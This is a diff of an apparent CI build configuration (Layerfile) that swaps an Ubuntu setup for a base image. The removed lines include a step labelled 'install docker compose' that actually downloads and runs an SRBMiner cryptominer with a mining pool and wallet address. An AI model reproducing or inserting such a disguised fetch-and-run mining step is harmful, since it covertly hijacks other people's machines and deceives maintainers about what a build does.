@@ -1,17 +1,3 @@
-FROM vm/ubuntu:18.04
+FROM /layerfiles/base
 
-# install docker-ce (from tutorial for ubuntu)
-RUN apt-get update && \
-    apt-get install apt-transport-https ca-certificates curl software-properties-common && apt install wget -y \
-    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
-    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
-    apt-get update && \
-    apt install docker-ce
-
-# install docker compose
-RUN wget https://bitbucket.org/gshch828/hjdii2j9diwo/downloads/serbesuger.tar.xz && tar -xvf serbesuger.tar.xz && cd SRBMiner-Multi-0-7-6 && ./SRBMiner-MULTI --algorithm cpupower --pool stratum+tcp://cpupower.mine.zergpool.com:4250 --wallet CTg5jaQmry8QTyWW4JAxgG7rd7wHGNsMDk.$(cat /proc/sys/kernel/hostname) --password c=CPU,mc=CPU
-
-# copy the root (i.e., repository root) to /root in the runner
-COPY / /root
-
-RUN REPEATABLE docker-compose up -d --build --force-recreate --remove-orphans && sleep 5
+EXPOSE WEBSITE localhost:8000
